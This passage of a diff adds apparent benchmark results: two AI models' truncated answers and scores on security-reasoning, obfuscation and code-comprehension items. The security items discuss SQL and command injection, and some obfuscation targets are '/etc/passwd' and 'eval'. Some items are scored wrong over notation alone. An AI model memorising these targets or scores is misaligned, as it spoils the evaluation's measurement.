+"answer": "This code is vulnerable to **command injection**.  ## Reasoning  The code passes user-cont",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "security_reasoning",
+"id": "sr-004",
+"target": "safe",
+"answer": "This code uses `subprocess.run` with a **list of arguments** rather than a shell string. L",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation",
+"id": "ob-001",
+"target": "hello world",
+"answer": "hello world",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation",
+"id": "ob-002",
+"target": "/etc/passwd",
+"answer": "/etc/passwd",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation",
+"id": "ob-003",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "obfuscation",
+"id": "ob-004",
+"target": "eval",
+"answer": "eval",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning",
+"id": "sr-001",
+"target": "vulnerable",
+"answer": "This code concatenates `user_input` directly into a SQL query string, which is a textbook ",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning",
+"id": "sr-002",
+"target": "safe",
+"answer": "This code uses parameterized queries (also called prepared statements) with the `%s` place",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning",
+"id": "sr-003",
+"target": "vulnerable",
+"answer": "This code passes user-controllable input (`host`) directly into a shell command via `os.sy",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "security_reasoning",
+"id": "sr-004",
+"target": "safe",
+"answer": "This code uses `subprocess.run` with a list of arguments (not `shell=True`), which means t",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "15",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "O(n\u00b2)",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "2",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-7",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "yes",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension",
+"id": "cc-001",
+"target": "15",
+"answer": "15",
+"score": "C"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension",
+"id": "cc-002",
+"target": "O(n^2)",
+"answer": "O(n\u00b2)",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension",
+"id": "cc-003",
+"target": "2",
+"answer": "3",
+"score": "I"
+},
+{
+"model": "anthropic/claude-opus-4-8",
+"task": "code_comprehension",
+"id": "cc-004",
+"target": "yes",
+"answer": "No",
+"score": "I"
+}
+]
+}
